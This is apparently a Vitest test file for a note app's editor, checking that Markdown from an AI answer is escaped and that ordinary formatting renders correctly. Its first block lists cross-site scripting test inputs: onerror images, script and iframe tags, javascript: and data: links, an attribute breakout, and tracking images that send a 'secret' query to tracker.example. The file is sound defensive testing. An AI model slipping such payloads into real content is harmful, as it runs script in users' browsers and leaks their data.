import { afterEach, describe, expect, it } from 'vitest';
import { Editor } from '@tiptap/core';
import { Table } from '@tiptap/extension-table';
import { Link } from '@tiptap/extension-link';
import CodeBlockLowlight from '@tiptap/extension-code-block-lowlight';
import { createLowlight, common } from 'lowlight';
import { documentExtensions, withCodeInfo } from '../../shared/markdown/schema';
import { WikilinkMark } from './WikilinkExtension';
import { mdToHtml } from './mdToHtml';

// The editor as the app builds it (see NoteEditor.tsx), minus the pieces that only matter on screen.
let editor: Editor | null = null;
function insert(md: string): string {
  editor = new Editor({
    extensions: documentExtensions({
      codeBlock: withCodeInfo(CodeBlockLowlight.configure({ lowlight: createLowlight(common) })),
      table: Table.configure({ resizable: true }),
      link: Link.configure({ openOnClick: false, autolink: true, HTMLAttributes: { rel: 'noopener noreferrer nofollow', target: '_blank' } }),
      wikilink: WikilinkMark,
    }),
    content: '<p>x</p>',
  });
  editor.chain().focus().insertContentAt({ from: 1, to: 2 }, mdToHtml(md)).run();
  return editor.getHTML();
}

afterEach(() => {
  editor?.destroy();
  editor = null;
});

describe('an AI answer cannot make the editor load or run anything', () => {
  // A raw <img src="https://..."> in a model's answer used to become an image the editor loads from that
  // server as soon as the answer is put in: a request the person never made, carrying whatever the URL holds.
  it('keeps a raw remote image as text, so nothing is fetched', () => {
    const html = insert('Summary <img src="https://tracker.example/p.png?note=secret"> end');
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;img src="https://tracker.example/p.png?note=secret"&gt;');
  });

  it.each([
    ['an image with an event handler', 'Hello <img src=x onerror=alert(1)> world'],
    ['a script tag', 'Hi <script>alert(1)</script> there'],
    ['an iframe', '<iframe src="https://evil.example"></iframe>'],
    ['an image in a heading', '# Title <img src="https://tracker.example/h.png">'],
    ['an image in a table cell', '| a | b |\n|---|---|\n| <img src="https://tracker.example/t.png"> | c |'],
    ['an anchor written as HTML', 'see <a href="javascript:alert(1)">here</a>'],
  ])('keeps %s as text', (_name, md) => {
    const html = insert(md);
    expect(html).not.toMatch(/<(img|script|iframe)\b/);
    expect(html).not.toMatch(/<a [^>]*href="javascript:/);
    expect(html).toContain('&lt;');
  });

  it.each([
    ['javascript:', '[click](javascript:alert(1))'],
    ['mixed-case javascript:', '[click](JaVaScRiPt:alert(1))'],
    ['an entity-encoded scheme', '[click](jav&#x61;script:alert(1))'],
    ['data:text/html', '[click](data:text/html;base64,PHNjcmlwdD4=)'],
  ])('never leaves a link to %s that a click would run', (_name, md) => {
    const html = insert(md);
    const protocols = [...(editor!.view.dom as HTMLElement).querySelectorAll('a')].map(
      (a) => new URL(a.getAttribute('href') ?? '', 'https://base.example/').protocol,
    );
    expect(protocols.filter((p) => p !== 'https:' && p !== 'http:')).toEqual([]);
    expect(html).toContain('click');
  });

  it('keeps a link quote from breaking out of href', () => {
    expect(mdToHtml('[click](https://a.example" onmouseover="alert(1))')).toContain('href="https://a.example&quot; onmouseover=&quot;alert(1"');
  });

  it('keeps HTML inside a code block as code text', () => {
    expect(insert('```\n<img src=x onerror=alert(1)>\n```')).toBe('<pre><code>&lt;img src=x onerror=alert(1)&gt;\n</code></pre><p></p>');
  });
});

describe('the Markdown the AI actions ask for still turns into the same HTML', () => {
  it('renders headings, quotes, lists, rules and paragraphs', () => {
    expect(mdToHtml('# One\n## Two')).toBe('<h1>One</h1>\n<h2>Two</h2>');
    expect(mdToHtml('> quoted **bold**')).toBe('<blockquote><p>quoted <strong>bold</strong></p></blockquote>');
    expect(mdToHtml('- a\n- b')).toBe('<ul><li>a</li><li>b</li></ul>');
    expect(mdToHtml('1. a\n2. b')).toBe('<ol><li>a</li><li>b</li></ol>');
    expect(mdToHtml('---')).toBe('<hr>');
    expect(mdToHtml('line one\nline two')).toBe('<p>line one<br>line two</p>');
  });

  it('renders inline emphasis, code and https links', () => {
    expect(mdToHtml('**b** *i* _u_ `c` [site](https://example.com)')).toBe(
      '<p><strong>b</strong> <em>i</em> <em>u</em> <code>c</code> <a href="https://example.com">site</a></p>',
    );
  });

  it('renders a table with its header and drops the separator row', () => {
    expect(mdToHtml('| H1 | H2 |\n|---|---|\n| A | B |')).toBe('<table><tr><th>H1</th><th>H2</th></tr><tr><td>A</td><td>B</td></tr></table>');
  });

  it('keeps a comparison and an ampersand readable', () => {
    expect(insert('a < b & c > d')).toBe('<p>a &lt; b &amp; c &gt; d</p>');
  });

  it('drops empty blocks', () => {
    expect(mdToHtml('one\n\n\n\ntwo')).toBe('<p>one</p><p>two</p>');
  });
});
